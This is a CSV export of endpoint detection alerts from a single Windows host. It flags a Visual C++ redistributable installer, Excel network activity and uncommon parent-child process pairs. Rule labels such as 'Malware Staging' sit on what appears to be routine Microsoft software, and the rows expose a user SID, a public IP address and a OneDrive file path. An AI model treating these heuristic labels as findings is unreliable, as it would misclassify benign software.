"Jun 1, 2026 @ 14:21:44.623",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1040\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-FDA76674
"Jun 1, 2026 @ 14:21:44.622",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1040\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-EC770C12
"Jun 1, 2026 @ 14:21:44.620",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1036\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-6F21D99B
"Jun 1, 2026 @ 14:21:44.619",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1036\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-6FA5A3D1
"Jun 1, 2026 @ 14:21:44.618",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1031\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-913C3808
"Jun 1, 2026 @ 14:21:44.617",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1031\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-38175E95
"Jun 1, 2026 @ 14:21:44.615",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1029\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-EA194F2B
"Jun 1, 2026 @ 14:21:44.614",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1029\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-21AB6D65
"Jun 1, 2026 @ 14:21:44.613",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1028\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-1075047A
"Jun 1, 2026 @ 14:21:45.822",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1055\thm.wxl,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-E459760E
"Jun 1, 2026 @ 14:21:45.821",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1055\license.rtf,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-2A66CCFC
"Jun 1, 2026 @ 14:21:45.820",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1049\thm.wxl,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-366797D3
"Jun 1, 2026 @ 14:21:45.818",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1046\license.rtf,,deletion,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-AEEFD114
"Jun 1, 2026 @ 14:21:45.217",C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{78d4ddb5-69a4-4e33-8d81-c18d0fee1b6e}\.be\vc_redist.x64.exe,,,,,,load,"15,060",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-F4A5F3AF
"Jun 1, 2026 @ 14:21:45.118",C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,"""C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe"" -q -burn.elevated BurnPipe.{FD3536DD-AD15-4793-9C3D-00E8EC7346A4} {DD33A804-169E-4732-A47A-2CFD6A306981} 29508",Malware Staging,20,Execution from user-writable path: c:\windows\temp\{78d4ddb5-69a4-4e33-8d81-c18d0fee1b6e}\.be\vc_redist.x64.exe,,,,,,start,"15,060",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D08C4516
"Jun 1, 2026 @ 14:21:45.061",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\AutoDetect,,,modification,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-E763C5BC
"Jun 1, 2026 @ 14:21:45.060",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Windows\CurrentVersion\Internet Settings\ZoneMap\UNCAsIntranet,,,modification,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-39808D51
"Jun 1, 2026 @ 14:21:44.974",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.be\VC_redist.x64.exe,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D7550645
"Jun 1, 2026 @ 14:21:44.713",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,,,load,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-3B0B0866
"Jun 1, 2026 @ 14:21:44.645",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\BootstrapperApplicationData.xml,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-5114F6FB
"Jun 1, 2026 @ 14:21:44.644",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\3082\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-E63AA894
"Jun 1, 2026 @ 14:21:44.643",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\3082\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-9E86F3FD
"Jun 1, 2026 @ 14:21:44.642",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\2052\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-E9C5AAE0
"Jun 1, 2026 @ 14:21:44.640",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\2052\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-B3DD39CF
"Jun 1, 2026 @ 14:21:44.639",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1055\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D3833A96
"Jun 1, 2026 @ 14:21:44.637",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1055\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-18E4339E
"Jun 1, 2026 @ 14:21:44.636",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1049\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-54BECACE
"Jun 1, 2026 @ 14:21:44.635",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1049\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-D60880BC
"Jun 1, 2026 @ 14:21:44.633",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1046\license.rtf,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-9F5AE730
"Jun 1, 2026 @ 14:21:58.075",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Local\Temp\{83115d11-b386-4a29-878b-d2bc01327358}.png,,creation,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-2F3B42FB
"Jun 1, 2026 @ 14:21:57.994",C:\Windows\explorer.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\explorer.exe,,,,C:\Users\DELL\AppData\Local\Temp\{83a7b31e-d67c-4f19-baef-41c3e6404f1b}.png,,creation,"7,284",,,False,LOW,LOW,Likely False Positive,Monitor,Collect file artefacts; hash and submit to VT,AH-B8F9C898
"Jun 1, 2026 @ 14:21:44.612",C:\Windows\Temp\{20A855C1-AE88-4232-8344-2B69A1F8BD6B}\.cr\vc_redist.x64.exe,,,Malware Staging,20,Execution from user-writable path: c:\windows\temp\{20a855c1-ae88-4232-8344-2b69a1f8bd6b}\.cr\vc_redist.x64.exe,,,,C:\Windows\Temp\{78D4DDB5-69A4-4E33-8D81-C18D0FEE1B6E}\.ba\1028\thm.wxl,,creation,"29,508",,,False,LOW,LOW,Needs Review,Monitor,Collect file artefacts; hash and submit to VT,AH-4C1DAC08
"Jun 1, 2026 @ 14:24:13.771",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\1380790193167760279.C4,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-1C17F3D4
"Jun 1, 2026 @ 14:24:04.204",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.146,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-151F69DF
"Jun 1, 2026 @ 14:24:12.919",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\CoauthLastAccepted.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-88E3BF5C
"Jun 1, 2026 @ 14:24:01.280",C:\Windows\System32\SearchFilterHost.exe,,,Rare Parent-Child,15,Rare process pair: -->searchfilterhost.exe,,,,,,load,"28,780",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-539F1F08
"Jun 1, 2026 @ 14:23:59.533",C:\Windows\System32\SearchFilterHost.exe,C:\Windows\System32\SearchIndexer.exe,"""C:\Windows\System32\SearchFilterHost.exe"" 888 2764 2760 872 {06DC0F6A-A3E7-4365-A8E8-F674FE2E6361}",Rare Parent-Child,15,Rare process pair: searchindexer.exe->searchfilterhost.exe,,,,,,start,"17,632",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-BAD17DAE
"Jun 1, 2026 @ 14:22:00.125",C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\OLicenseHeartbeat.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,OLicenseHeartbeat.exe tokenactivate,Rare Parent-Child,15,Rare process pair: officeclicktorun.exe->olicenseheartbeat.exe,,,,,,end,"5,952",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-75657E38
"Jun 1, 2026 @ 14:21:57.237",C:\Program Files\Microsoft Office\root\vfs\ProgramFilesCommonX64\Microsoft Shared\Office16\OLicenseHeartbeat.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,OLicenseHeartbeat.exe tokenactivate,Rare Parent-Child,15,Rare process pair: officeclicktorun.exe->olicenseheartbeat.exe,,,,,,start,"5,952",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-3E4F3EC4
"Jun 1, 2026 @ 14:21:52.350",C:\Windows\System32\dllhost.exe,C:\Windows\System32\svchost.exe,C:\Windows\system32\DllHost.exe /Processid:{F32D97DF-E3E5-4CB9-9E3E-0EB5B4E49801},Rare Parent-Child,15,Rare process pair: svchost.exe->dllhost.exe,,,,,,end,"35,120",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-D4D7472B
"Jun 1, 2026 @ 14:21:47.420",C:\Program Files\Microsoft Office\root\Integration\Addons\vc_redist.x86.exe,C:\Program Files\Common Files\microsoft shared\ClickToRun\OfficeClickToRun.exe,"""C:\Program Files\Microsoft Office\root\integration\Addons\vc_redist.x86.exe"" /quiet /norestart",Rare Parent-Child,15,Rare process pair: officeclicktorun.exe->vc_redist.x86.exe,,,,,,end,"10,628",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-5BEA3CF0
"Jun 1, 2026 @ 14:24:53.227",C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe,C:\Windows\System32\svchost.exe,"""C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe"" -ServerName:Hx.IPC.Server",Rare Parent-Child,15,Rare process pair: svchost.exe->hxtsr.exe,,,,,,end,"12,776",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Manual analyst review required,AH-EF0D99C4
"Jun 1, 2026 @ 14:24:16.458",C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe,C:\Windows\System32\svchost.exe,"""C:\Program Files\WindowsApps\microsoft.windowscommunicationsapps_16005.14326.22342.0_x64__8wekyb3d8bbwe\HxTsr.exe"" -ServerName:Hx.IPC.Server",Rare Parent-Child,15,Rare process pair: svchost.exe->hxtsr.exe,,,,,,start,"12,776",,,True,FP-SUPPRESSED,LOW,Allowlisted / FP Suppressed,Monitor,Manual analyst review required,AH-816BCB23
"Jun 1, 2026 @ 14:24:11.980",C:\Windows\System32\smartscreen.exe,C:\Windows\System32\svchost.exe,C:\Windows\System32\smartscreen.exe -Embedding,Rare Parent-Child,15,Rare process pair: svchost.exe->smartscreen.exe,,,,,,start,"37,552",,,False,INFO,LOW,Needs Review,Monitor,Manual analyst review required,AH-C434713A
"Jun 1, 2026 @ 14:24:01.982",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_EFHVFAHJGZAHASCRF2GHFXBECCFFCDFA.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-101AB8C1
"Jun 1, 2026 @ 14:24:01.981",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\OfficeFileCache\0\0\FJCWGCFKDOGYHHFRCGCYHVBPEGBHHKDD\e_H6AWBBHFHXB6FPFSDLFUH3DBGLDFD3AC.R,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-10EA1E12
"Jun 1, 2026 @ 14:24:00.735",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,150.171.23.11,,,,disconnect_received,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-466E29A7
"Jun 1, 2026 @ 14:24:00.431",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\ResourceInfoCache\2a5ae2d3b00dc85f60bf6c9e5197c6940ee9ce62.temp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-413CDA35
"Jun 1, 2026 @ 14:24:00.408",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,HKEY_USERS\S-1-5-21-3330616437-3750286687-2521933251-1001\Software\Microsoft\Office\16.0\Excel\Security\Trusted Documents\TrustRecords\https://d.docs.live.net/b1c53643363b744d/Documents/Primus.xlsx,,,modification,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-8C3BEB81
"Jun 1, 2026 @ 14:24:00.322",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Temp\2mvf8it,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D727C4CF
"Jun 1, 2026 @ 14:23:35.796",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\IdentityCache\1\UD\u_TFCB0FB8FC4JM4J7\e_C2GK9UTC67FSUCG3\Accounts\r_74DB6FURNR2TGPBK.bin,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7A950E9D
"Jun 1, 2026 @ 14:23:35.632",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\DEM\en-US.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-9C826612
"Jun 1, 2026 @ 14:23:35.319",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.133,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6B3DC0C4
"Jun 1, 2026 @ 14:23:35.313",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,officeclient.microsoft.com,lookup_result,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-6C4E206E
"Jun 1, 2026 @ 14:23:35.253",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,,officeclient.microsoft.com,lookup_requested,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-D77E2E61
"Jun 1, 2026 @ 14:24:11.962",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Local\Microsoft\Office\16.0\DisplayForm\UrlFriendlyPathMapping3.json,,overwrite,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-BED84F11
"Jun 1, 2026 @ 14:24:09.723",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15bf3dce.TMP,,deletion,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-CB8BCA3E
"Jun 1, 2026 @ 14:24:09.722",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-42445015
"Jun 1, 2026 @ 14:24:09.721",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15bf3dce.TMP,,rename,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-EFDDBB94
"Jun 1, 2026 @ 14:24:09.718",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\b8ab77100df80ab2.customDestinations-ms~RF15bf3dce.TMP,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-CFC5F2D7
"Jun 1, 2026 @ 14:24:09.714",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,,,,C:\Users\DELL\AppData\Roaming\Microsoft\Windows\Recent\CustomDestinations\Y6IBLZ8RI69VNV8AN1ZL.temp,,creation,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-79CD85FC
"Jun 1, 2026 @ 14:24:04.689",C:\Program Files\Microsoft Office\root\Office16\EXCEL.EXE,,,Network Outlier,15,High distinct destinations for excel.exe,173.10.254.170,52.110.14.189,,,,connection_attempted,"25,556",,,False,INFO,LOW,Needs Review,Monitor,Review process network history; identify C2 pattern,AH-7B381340
